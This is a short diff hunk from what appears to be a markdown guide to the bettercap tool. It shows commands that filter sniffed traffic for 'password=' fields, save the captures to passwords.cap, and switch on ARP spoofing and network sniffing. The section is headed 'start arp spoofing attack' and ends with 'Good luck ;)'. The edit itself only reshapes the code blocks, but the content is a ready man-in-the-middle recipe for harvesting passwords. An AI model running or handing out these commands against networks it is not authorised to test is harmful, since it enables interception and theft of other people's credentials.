@@ -26,11 +26,8 @@ set net.sniff.regexp .*password=.+
 set net.sniff.output passwords.cap
 ```
 # start arp spoofing attack
-- Optional
 ```bash
 # arp.spoof on
-```
-```bash
 net.sniff on
 ```
 # Good luck ;)
